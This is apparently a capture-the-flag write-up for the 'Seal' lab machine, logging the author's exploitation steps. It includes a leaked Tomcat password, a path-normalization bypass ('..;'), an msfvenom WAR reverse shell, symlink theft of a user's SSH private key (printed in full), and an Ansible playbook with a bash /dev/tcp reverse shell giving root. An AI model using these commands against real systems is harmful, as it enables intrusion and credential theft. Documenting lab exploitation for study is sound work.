# Seal

![Seal.png](Seal/Seal.png)

### 07/11/2021

[!] This document is just a report of my process of exploitation.  

First starting with port scan to enumerate each open port and services version.

```python
[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 21:11 -03
Initiating Ping Scan at 21:11
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
443/tcp  open  https      syn-ack
8080/tcp open  http-proxy syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds
```

![Seal/Untitled.png](Seal/Untitled.png)

**ssl/http nginx 1.18.0**

First look at page:

![Seal/Untitled%201.png](Seal/Untitled%201.png)

**8080/tcp open http-prox**

![Seal/Untitled%202.png](Seal/Untitled%202.png)

Probably this challenge will work between the web services, we go to enumerate pages subdomains and directories to find interesting things.

This website is a GitBucket and has some repositories.

![Seal/Untitled%203.png](Seal/Untitled%203.png)

We can read the git log.

![Seal/Untitled%204.png](Seal/Untitled%204.png)

Downloaded the two directories to analyze interesting things and i found a name: alex@seal.htb

Adding seal.htb in /etc/hosts config file can return the port 443 that show Seal market.

![Seal/Untitled%205.png](Seal/Untitled%205.png)

Admin email.

![Seal/Untitled%206.png](Seal/Untitled%206.png)

Performing a directory/files scan.

![Seal/Untitled%207.png](Seal/Untitled%207.png)

```python
2021/07/13 12:07:42 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 0] [--> http://seal.htb/admin/]
/css                  (Status: 302) [Size: 0] [--> http://seal.htb/css/]  
/host-manager         (Status: 302) [Size: 0] [--> http://seal.htb/host-manager/]
/icon                 (Status: 302) [Size: 0] [--> http://seal.htb/icon/]        
/images               (Status: 302) [Size: 0] [--> http://seal.htb/images/]      
/index.html           (Status: 200) [Size: 19737]                                
/js                   (Status: 302) [Size: 0] [--> http://seal.htb/js/]          
/manager              (Status: 302) [Size: 0] [--> http://seal.htb/manager/]
```

Analyzing more the GitBucket I found some comments. 

![Seal/Untitled%208.png](Seal/Untitled%208.png)

Reading the commit history of the seal market I found this password.

![Seal/Untitled%209.png](Seal/Untitled%209.png)

Trying to login in the accounts, this is a Luis's password:

```python
user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"
```

![Seal/Untitled%2010.png](Seal/Untitled%2010.png)

I tried commit files, but this files doesn’t alter the original website. 

Explaining more about roles, it have three permissions: gitbucket user, project creator, admin and system admin. A person with necessary permissions can execute shell arbitrary commands.

Reference: [https://blog.sonarsource.com/bitbucket-path-traversal-to-rce?redirect=rips](https://blog.sonarsource.com/bitbucket-path-traversal-to-rce?redirect=rips)

The URL was crafted using the seal-market PATH repository and the CVE payload parameters.

![Seal/Untitled%2011.png](Seal/Untitled%2011.png)

But didn't work, let's try another thing.

This user has some more permissions.

![Seal/Untitled%2012.png](Seal/Untitled%2012.png)

# Hooks

In GitBucket hooks have  a input that we can test the hooks.

![Seal/Untitled%2013.png](Seal/Untitled%2013.png)

![Seal/Untitled%2014.png](Seal/Untitled%2014.png)

Possible way to explore server:

![Seal/Untitled%2015.png](Seal/Untitled%2015.png)

Error in [localhost](http://localhost)

![Seal/Untitled%2016.png](Seal/Untitled%2016.png)

 but with directory /admin works without erros:

![Seal/Untitled%2017.png](Seal/Untitled%2017.png)

Let's try use some script available in git to execute remote commands with POST method: 

API returns users when we change the URL:

```python
curl --header "Authorization: Basic bHVpczo0Mk1ySEJmKno4e1ol" http://10.10.10.250:8080/api/v3/users/sidhawks1 && echo "\n"
curl --header "Authorization: Basic bHVpczo0Mk1ySEJmKno4e1ol" http://10.10.10.250:8080/api/v3/users/luis && echo "\n"
curl --header "Authorization: Basic bHVpczo0Mk1ySEJmKno4e1ol" http://10.10.10.250:8080/api/v3/users/root && echo "\n"
```

![Seal/Untitled%2018.png](Seal/Untitled%2018.png)

More tries of explore the application:

[https://afinepl.medium.com/testing-and-exploiting-java-deserialization-in-2021-e762f3e43ca2](https://afinepl.medium.com/testing-and-exploiting-java-deserialization-in-2021-e762f3e43ca2)

[https://www.youtube.com/watch?v=VYdo3--SPjw&ab_channel=NetsecExplained](https://www.youtube.com/watch?v=VYdo3--SPjw&ab_channel=NetsecExplained)

[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)

[https://www.youtube.com/watch?v=YPzMTKsBMnI&ab_channel=SourceMeetsSink](https://www.youtube.com/watch?v=YPzMTKsBMnI&ab_channel=SourceMeetsSink)

[https://www.youtube.com/watch?v=B144CJ7jNHo&ab_channel=CyberSecurityTV](https://www.youtube.com/watch?v=B144CJ7jNHo&ab_channel=CyberSecurityTV)

In local IP:8080 returns 403 error when requesting webpage.

![Seal/Untitled%2019.png](Seal/Untitled%2019.png)

API v3 fuzz

![Seal/Untitled%2020.png](Seal/Untitled%2020.png)

If the IP exists the response is:

![Seal/Untitled%2021.png](Seal/Untitled%2021.png)

If doesn't exists the response is: 

![Seal/Untitled%2022.png](Seal/Untitled%2022.png)

Forbidden page:

![Untitled](Seal/Untitled%2023.png)

![Untitled](Seal/Untitled%2024.png)

### Correct exploitation

After try many ways of exploitation I tried bypass the page manager of tomcat with path traversal,

When tomcat sees it, drops that selected text area:

![Untitled](Seal/Untitled%2025.png)

![Untitled](Seal/Untitled%2026.png)

[https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

### Cache-related attack

When reverse proxy use cache: The caching works just a reverse proxy store a response in the backend in the cache, and returns the same response from the cache without accessing the backend.

Server proxies caching.

With cache, without cache.

![Untitled](Seal/Untitled%2027.png)

[https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/](https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/)

Changing the rules of a reverse proxy, it can cache even though the cache control header restricts caching. So we can create rules to cache somethings, and is that occurs on this lab. 

Nginx+Tomcat

Nginx will cache all responses from the /images

![Untitled](Seal/Untitled%2028.png)

All we need is open the next URL

```python
/imagems/..;/something.jpg
```

![Untitled](Seal/Untitled%2029.png)

[https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

Nginx rules appends the remainder to destination

```python
something;name=admin/admin/dashboard
```

![Untitled](Seal/Untitled%2030.png)

Second way:

```python
admin/Inexistent/..;/dashboard
```

![Untitled](Seal/Untitled%2031.png)

Tomcat panel:

![Untitled](Seal/Untitled%2032.png)

To get the reverse shell just craft a War payload, that is a collection of jar files.

```python
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war
```

Use the path normalization to upload the reverse shell.

![Untitled](Seal/Untitled%2033.png)

Let's try again:

![Untitled](Seal/Untitled%2034.png)

Ok message:

![Untitled](Seal/Untitled%2035.png)

Reverse shell with success!

![Untitled](Seal/Untitled%2036.png)

Useful playbook

![Untitled](Seal/Untitled%2037.png)

It makes a synchronization 

***Ansible Playbooks*** offer a repeatable, re-usable, simple configuration management and multi-machine deployment system

![Untitled](Seal/Untitled%2038.png)

We can make tasks executions.

![Untitled](Seal/Untitled%2039.png)

Tar file:

![Untitled](Seal/Untitled%2040.png)

I understand what we must have to do, is create a link of an archive in the upload directory, it will create a backup, with the backup we can extract and read files.

![Untitled](Seal/Untitled%2041.png)

### LN

Using ln command: It create a hard link, a symbolic link: Create a symbolic link to the Luis id_rsa and when a application do a backup just enter in the “/opt/backups/archives” and extract the backup.

```c
ln -s /home/luis/.ssh/id_rsa key.key
```

Backup:

![Untitled](Seal/Untitled%2042.png)

Luis ID_RSA

```python
-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
```

Let's use this as example to create a YML file with a command and execute:

![Untitled](Seal/Untitled%2043.png)

In the command put your reverse shell and execute the binary. Yeah it works and we get a root session:

```python
- hosts: localhost
  tasks:
  - name: rev shell
    command: /bin/bash -c "bash -i >& /dev/tcp/10.10.14.17/3302 0>&1"
```

![Untitled](Seal/Untitled%2044.png)
